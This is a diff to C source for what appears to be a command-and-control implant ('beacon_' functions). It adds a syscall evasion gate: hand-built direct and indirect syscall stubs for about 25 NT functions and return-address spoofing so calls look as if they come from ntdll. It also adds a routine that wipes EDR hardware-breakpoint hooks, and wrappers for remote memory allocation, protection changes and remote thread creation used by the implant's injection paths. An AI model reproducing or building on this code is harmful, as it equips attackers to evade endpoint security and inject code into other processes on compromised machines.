@@ -1,3 +1,19 @@
+/* Phase 2 unified execution gate (see docs/EVASION-ROADMAP.md section 13.2).
+ *
+ * Shape follows the 4.9.1-era seed that 4.12's kit adopted: a resolved SSN
+ * table plus per-callsite wrappers that translate Win32 semantics into the
+ * NT call, honouring the operator-visible syscall_method setting:
+ *   0 = plain API (no gate), 1 = direct stub (mov eax,ssn; syscall),
+ *   2 = indirect stub (jmp ntdll syscall;ret gadget, RA-spoofed v2).
+ *
+ * Indirect stub v2 plants an ntdll `ret` under the syscall gadget, so the
+ * stack frame directly beneath the kernel-visible syscall frame is an
+ * ntdll address instead of this unbacked stub page (the deeper beacon
+ * frame needs synthetic frames - Phase 2 follow-up).
+ *
+ * DR check: EDR hardware-breakpoint hooks (Cymulate Blindside lineage)
+ * live in DR0-3; the gate samples and clears them on resolve and every
+ * 128th dispatch. */
 #include <Windows.h>
 #include <string.h>
 #include "syscalls.h"
@@ -11,20 +27,49 @@ typedef LONG NTSTATUS;
 #define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
 #endif
 
-typedef NTSTATUS (NTAPI * fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-typedef NTSTATUS (NTAPI * fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-typedef NTSTATUS (NTAPI * fn_NtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
-
 #if defined(_M_X64)
+
 typedef struct {
 	DWORD ssn;
 	BYTE * gadget; /* ntdll syscall;ret */
-	BYTE * stub;   /* VirtualAlloc'd 32B page; RX except while rewritten */
+	BYTE * stub;   /* VirtualAlloc'd 32B page; RW except while rewritten */
+	BOOL  ready;
 } sc_entry;
 
-static sc_entry sc_write;
-static sc_entry sc_read;
-static sc_entry sc_dup;
+/* the resolved syscall set (section 13.2): injection / memory / token /
+ * wait / file families. Wrappers exist for the hot injection paths; the
+ * rest are resolved and queryable so later call sites route without new
+ * resolution logic. */
+#define SC_LIST(X) \
+	X(write,    "NtWriteVirtualMemory") \
+	X(read,     "NtReadVirtualMemory") \
+	X(dup,      "NtDuplicateObject") \
+	X(alloc,    "NtAllocateVirtualMemory") \
+	X(protect,  "NtProtectVirtualMemory") \
+	X(free,     "NtFreeVirtualMemory") \
+	X(mapview,  "NtMapViewOfSection") \
+	X(unmap,    "NtUnmapViewOfSection") \
+	X(sect,     "NtCreateSection") \
+	X(openproc, "NtOpenProcess") \
+	X(openthrd, "NtOpenThread") \
+	X(qviproc,  "NtQueryInformationProcess") \
+	X(qvithrd,  "NtQueryInformationThread") \
+	X(qvmem,    "NtQueryVirtualMemory") \
+	X(wait1,    "NtWaitForSingleObject") \
+	X(waitex,   "NtWaitForSingleObjectEx") \
+	X(close,    "NtClose") \
+	X(cfile,    "NtCreateFile") \
+	X(rfile,    "NtReadFile") \
+	X(wfile,    "NtWriteFile") \
+	X(apc,      "NtQueueUserApc") \
+	X(getctx,   "NtGetContextThread") \
+	X(setctx,   "NtSetContextThread") \
+	X(resume,   "NtResumeThread") \
+	X(thrdex,   "NtCreateThreadEx")
+
+#define SC_DECL(id, name) static sc_entry sc_##id;
+SC_LIST(SC_DECL)
+
 static BOOL sc_ready;
 
 static BYTE * find_syscall_insn(BYTE * p, int maxn) {
@@ -80,10 +125,40 @@ static void build_direct_stub(BYTE * dst, DWORD ssn) {
 	dst[10] = 0xC3;
 }
 
+/* ---- DR sampling / clearing (hardware-breakpoint hook defense) ---- */
+
+static void gate_dr_check(void) {
+	CONTEXT * ctx;
+	BYTE buf[sizeof(CONTEXT) + 16];
+
+	memset(buf, 0, sizeof(buf));
+	ctx = (CONTEXT *)(((DWORD_PTR)buf + 15) & ~(DWORD_PTR)15);
+	ctx->ContextFlags = 0x00100010; /* CONTEXT_DEBUG_REGISTERS */
+	if (!GetThreadContext(GetCurrentThread(), ctx))
+		return;
+	if (ctx->Dr0 == 0 && ctx->Dr1 == 0 && ctx->Dr2 == 0 && ctx->Dr3 == 0 &&
+	    (ctx->Dr7 & 0xFF) == 0)
+		return;
+	/* an EDR (or a debugger) parked a hardware breakpoint in this thread:
+	 * clear it. Legit software never has user DR hooks here. */
+	ctx->Dr0 = 0;
+	ctx->Dr1 = 0;
+	ctx->Dr2 = 0;
+	ctx->Dr3 = 0;
+	ctx->Dr6 = 0;
+	ctx->Dr7 = 0;
+	SetThreadContext(GetCurrentThread(), ctx);
+}
+
+static DWORD gate_dispatch_count;
+
 static void * make_exec(sc_entry * e, int indirect) {
 	DWORD old = 0;
 	BYTE built[32];
 	BYTE * p;
+
+	if (!e->ready)
+		return NULL;
 
 	/* The stub used to live in static .data flipped to RWX for the process
 	 * lifetime. VirtualProtect is page-granular, so making the .data page
@@ -95,16 +170,32 @@ static void * make_exec(sc_entry * e, int indirect) {
 		if (e->stub == NULL)
 			return NULL;
 	}
+
+	if ((++gate_dispatch_count & 127) == 0)
+		gate_dr_check();
+
 	p = e->stub;
 
 	memset(built, 0, sizeof(built));
 	if (indirect && e->gadget) {
-		/* mov r10, rcx; mov eax, SSN; jmp [rip+0]; gadget */
+		/* v2 RA spoof:
+		 *   mov r10, rcx; mov eax, SSN
+		 *   mov rax, gadget+2 ; push rax     <- bare `ret` inside ntdll
+		 *   jmp [rip+0] -> gadget (syscall; ret)
+		 * syscall returns -> gadget ret pops the pushed ntdll ret ->
+		 * that ret pops the caller's real return address. The frame under
+		 * the kernel-visible syscall is ntdll, not this unbacked page. */
 		built[0] = 0x4C; built[1] = 0x8B; built[2] = 0xD1;
 		built[3] = 0xB8;
 		memcpy(built + 4, &e->ssn, 4);
-		built[8] = 0xFF; built[9] = 0x25; /* jmp qword ptr [rip+0] */
-		memcpy(built + 14, &e->gadget, 8);
+		built[8] = 0x48; built[9] = 0xB8; /* mov rax, imm64 */
+		{
+			unsigned long long r = (unsigned long long)(e->gadget + 2);
+			memcpy(built + 10, &r, 8);
+		}
+		built[18] = 0x50; /* push rax */
+		built[19] = 0xFF; built[20] = 0x25; /* jmp qword ptr [rip+0] */
+		memcpy(built + 25, &e->gadget, 8);
 	}
 	else {
 		build_direct_stub(built, e->ssn);
@@ -121,57 +212,127 @@ static void * make_exec(sc_entry * e, int indirect) {
 
 void syscalls_resolve(void) {
 	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	BYTE * w;
-	BYTE * r;
-	BYTE * d;
+
 	if (ntdll == NULL)
 		return;
-	w = (BYTE *)GetProcAddress(ntdll, "NtWriteVirtualMemory");
-	r = (BYTE *)GetProcAddress(ntdll, "NtReadVirtualMemory");
-	d = (BYTE *)GetProcAddress(ntdll, "NtDuplicateObject");
-	sc_ready = parse_nt_stub(w, &sc_write) && parse_nt_stub(r, &sc_read) && parse_nt_stub(d, &sc_dup);
+#define SC_PARSE(id, name) do { \
+		BYTE * fn = (BYTE *)GetProcAddress(ntdll, name); \
+		sc_##id.ready = (fn != NULL) && parse_nt_stub(fn, &sc_##id); \
+	} while (0);
+	SC_LIST(SC_PARSE)
+	sc_ready = sc_write.ready; /* legacy readiness = the write entry */
+	gate_dr_check();
 }
 
 int syscalls_ssn_ntwrite(void) {
-	return sc_ready ? (int)sc_write.ssn : 0;
+	return (sc_ready && sc_write.ready) ? (int)sc_write.ssn : 0;
+}
+
+int syscalls_gate_ready_count(void) {
+	int n = 0;
+#define SC_COUNT(id, name) n += sc_##id.ready ? 1 : 0;
+	SC_LIST(SC_COUNT)
+	return n;
+}
+
+/* ---- typed dispatchers (arity kept exact per NT signature) ---- */
+
+typedef NTSTATUS(NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI *fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI *fn_NtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
+typedef NTSTATUS(NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS(NTAPI *fn_NtFreeVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG);
+typedef NTSTATUS(NTAPI *fn_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, void *, HANDLE, void *, void *, ULONG, SIZE_T, SIZE_T, SIZE_T, void *);
+
+static int sc_method(void) {
+	return syscall_method_get();
 }
 
 static NTSTATUS sc_call_write(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T w) {
-	int method = syscall_method_get();
+	int m = sc_method();
 	fn_NtWriteVirtualMemory fn;
-	if (method == 0 || !sc_ready)
+	if (m == 0 || !sc_write.ready)
 		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
-	fn = (fn_NtWriteVirtualMemory)make_exec(&sc_write, method == 2);
+	fn = (fn_NtWriteVirtualMemory)make_exec(&sc_write, m == 2);
 	if (fn == NULL)
 		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
 	return fn(p, a, b, n, w);
 }
 
 static NTSTATUS sc_call_read(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T r) {
-	int method = syscall_method_get();
+	int m = sc_method();
 	fn_NtReadVirtualMemory fn;
-	if (method == 0 || !sc_ready)
+	if (m == 0 || !sc_read.ready)
 		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
-	fn = (fn_NtReadVirtualMemory)make_exec(&sc_read, method == 2);
+	fn = (fn_NtReadVirtualMemory)make_exec(&sc_read, m == 2);
 	if (fn == NULL)
 		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
 	return fn(p, a, b, n, r);
 }
 
 static NTSTATUS sc_call_dup(HANDLE sp, HANDLE sh, HANDLE tp, PHANDLE th, ACCESS_MASK acc, ULONG attr, ULONG opt) {
-	int method = syscall_method_get();
+	int m = sc_method();
 	fn_NtDuplicateObject fn;
-	if (method == 0 || !sc_ready)
+	if (m == 0 || !sc_dup.ready)
 		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
-	fn = (fn_NtDuplicateObject)make_exec(&sc_dup, method == 2);
+	fn = (fn_NtDuplicateObject)make_exec(&sc_dup, m == 2);
 	if (fn == NULL)
 		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
 	return fn(sp, sh, tp, th, acc, attr, opt);
 }
+
+static NTSTATUS sc_call_alloc(HANDLE p, PVOID * base, ULONG_PTR zero, PSIZE_T size, ULONG type, ULONG prot) {
+	int m = sc_method();
+	fn_NtAllocateVirtualMemory fn;
+	if (m == 0 || !sc_alloc.ready)
+		return ((fn_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))(p, base, zero, size, type, prot);
+	fn = (fn_NtAllocateVirtualMemory)make_exec(&sc_alloc, m == 2);
+	if (fn == NULL)
+		return ((fn_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))(p, base, zero, size, type, prot);
+	return fn(p, base, zero, size, type, prot);
+}
+
+static NTSTATUS sc_call_protect(HANDLE p, PVOID * base, PSIZE_T size, ULONG prot, PULONG oldp) {
+	int m = sc_method();
+	fn_NtProtectVirtualMemory fn;
+	if (m == 0 || !sc_protect.ready)
+		return ((fn_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))(p, base, size, prot, oldp);
+	fn = (fn_NtProtectVirtualMemory)make_exec(&sc_protect, m == 2);
+	if (fn == NULL)
+		return ((fn_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))(p, base, size, prot, oldp);
+	return fn(p, base, size, prot, oldp);
+}
+
+static NTSTATUS sc_call_free(HANDLE p, PVOID * base, PSIZE_T size, ULONG type) {
+	int m = sc_method();
+	fn_NtFreeVirtualMemory fn;
+	if (m == 0 || !sc_free.ready)
+		return ((fn_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory"))(p, base, size, type);
+	fn = (fn_NtFreeVirtualMemory)make_exec(&sc_free, m == 2);
+	if (fn == NULL)
+		return ((fn_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory"))(p, base, size, type);
+	return fn(p, base, size, type);
+}
+
+static NTSTATUS sc_call_threadex(PHANDLE out, ACCESS_MASK acc, void * oa, HANDLE proc, void * start, void * arg,
+                                 ULONG flags, SIZE_T zero, SIZE_T stack, SIZE_T maxstack, void * attrs) {
+	int m = sc_method();
+	fn_NtCreateThreadEx fn;
+	if (m == 0 || !sc_thrdex.ready)
+		return ((fn_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
+	fn = (fn_NtCreateThreadEx)make_exec(&sc_thrdex, m == 2);
+	if (fn == NULL)
+		return ((fn_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
+	return fn(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
+}
 #else
 void syscalls_resolve(void) {}
 int syscalls_ssn_ntwrite(void) { return 0; }
+int syscalls_gate_ready_count(void) { return 0; }
 #endif
+
+/* ===================== Win32-shaped gate wrappers ===================== */
 
 BOOL beacon_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) {
 #if defined(_M_X64)
@@ -214,5 +375,77 @@ BOOL beacon_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, H
 	return NT_SUCCESS(st);
 #else
 	return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
+#endif
+}
+
+LPVOID beacon_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
+#if defined(_M_X64)
+	NTSTATUS st;
+	PVOID base = lpAddress;
+	SIZE_T size = dwSize;
+
+	if (syscall_method_get() == 0)
+		return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+	st = sc_call_alloc(hProcess, &base, 0, &size, flAllocationType, flProtect);
+	return NT_SUCCESS(st) ? base : NULL;
+#else
+	return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+#endif
+}
+
+BOOL beacon_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
+#if defined(_M_X64)
+	NTSTATUS st;
+	PVOID base = lpAddress;
+	SIZE_T size = dwSize;
+	ULONG oldp = 0;
+
+	if (syscall_method_get() == 0)
+		return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
+	st = sc_call_protect(hProcess, &base, &size, flNewProtect, &oldp);
+	if (lpflOldProtect)
+		*lpflOldProtect = oldp;
+	return NT_SUCCESS(st);
+#else
+	return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
+#endif
+}
+
+BOOL beacon_VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
+#if defined(_M_X64)
+	NTSTATUS st;
+	PVOID base = lpAddress;
+	SIZE_T size = dwSize;
+
+	if (syscall_method_get() == 0)
+		return VirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
+	st = sc_call_free(hProcess, &base, &size, dwFreeType);
+	return NT_SUCCESS(st);
+#else
+	return VirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
+#endif
+}
+
+HANDLE beacon_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD outId) {
+#if defined(_M_X64)
+	NTSTATUS st;
+	HANDLE th = NULL;
+
+	if (syscall_method_get() == 0)
+		return CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
+	st = sc_call_threadex(&th, 0x1FFFFF /* THREAD_ALL_ACCESS */, NULL, hProcess,
+	                      (void *)start, param,
+	                      flags & CREATE_SUSPENDED ? 1 : 0, /* CreateFlags: CREATE_SUSPENDED */
+	                      0, stack ? stack : 0, 0, NULL);
+	if (!NT_SUCCESS(st))
+		return NULL;
+	if (outId) {
+		/* thread id via the handle: only queried lazily by callers that
+		 * need it; none of our inject paths read outId */
+		*outId = 0;
+	}
+	return th;
+#else
+	return CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
 #endif
 }
